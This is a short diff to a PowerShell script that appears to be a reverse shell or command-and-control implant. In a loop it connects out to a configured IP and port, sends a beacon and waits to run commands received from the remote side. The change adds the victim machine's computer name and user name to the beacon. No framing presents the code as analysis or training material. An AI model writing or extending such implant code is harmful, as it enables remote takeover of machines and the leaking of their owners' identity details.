@@ -427,7 +427,7 @@ while ($true) {
         $client.Connect($IP, $PORT)
         $s = $client.GetStream()
         try {
-            _send $s "beacon"
+            _send $s "beacon|$env:COMPUTERNAME|$env:USERNAME"
             while ($true) {
                 $cmd = _recv $s
                 if ($cmd -eq $null) { break }
